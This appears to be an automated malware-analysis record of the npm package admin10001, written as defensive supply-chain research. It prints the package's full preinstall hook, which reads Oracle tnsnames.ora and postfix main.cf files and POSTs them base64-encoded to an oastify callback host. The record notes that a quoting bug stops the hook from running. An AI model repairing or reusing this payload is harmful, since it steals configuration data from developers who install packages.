# npm admin10001@1.0.289

**Source:** datadog · **Source label:** malicious · **Released:** 2026-01-18 (registry) · **Assessment:** malicious (medium) · **Analysis:** ai (claude-opus-5-5)

## Summary

The only install code is a `preinstall` hook that runs `node -e "<inline JS>" &`. The inline script is meant to branch on `process.platform` (powershell search of `C:\` for `tnsnames.ora` on Windows, else `fs.existsSync` checks and reads of `/etc/tnsnames.ora`, an Oracle instantclient `tnsnames.ora` and postfix `main.cf`) and POST the result base64-encoded to an oastify[.]com callback host. But the script nests a double quote inside the shell's double-quoted argument, so the shell cuts the `-e` argument at `powershell -c Get-ChildItem`. Node gets an unterminated string literal, throws a SyntaxError and runs nothing. No gate, file read or network call is reached at install, so the record has no gates and no behaviours.

## Execution

- **preinstall** `node -e "const fs=require('fs'), cp=require('child_process'), http=require('http'); const oast='w74726imuk1erzg8ybl6m8nyapgg48sx.oastify[.]com'; let log=''; try { if(process.platform==='win32'){ log += cp.execSync('powershell -c "Get-ChildItem -Path C:\\ -Filter tnsnames.ora -Recurse -ErrorAction SilentlyContinue | Select-Object FullName"').toString(); } else { const paths=['/etc/tnsnames.ora', '/opt/oracle/instantclient/network/admin/tnsnames.ora', '/var/spool/postfix/etc/main.cf']; paths.forEach(p=>{ if(fs.existsSync(p)) log+=p+':'+fs.readFileSync(p,'utf8')+'\n'; }); } } catch(e){ log+=e.message; } const req=http.request({hostname:oast,method:'POST',path:'/exfil'},()=>{}); req.write(Buffer.from(log).toString('base64')); req.end();" &`: no package files; detached_child, inline_eval; errors hidden.

## Notes

- The quoting break happens the same way under sh (npm's default on POSIX) and cmd on Windows. The rest of the hook ends up as extra node arguments and a pipe into `Select-Object`, which is not an executable in either shell.
- The trailing `&` backgrounds the pipeline under sh, so the hook exits 0 and the failure is hidden.
- If a fixed version of this package turns up, expect gates `process.platform == win32` (portability) and per-path `fs.existsSync` target-artifact gates, plus exfil to the OAST host.
- The callback host is a per-user collaborator subdomain (w747….oastify[.]com).
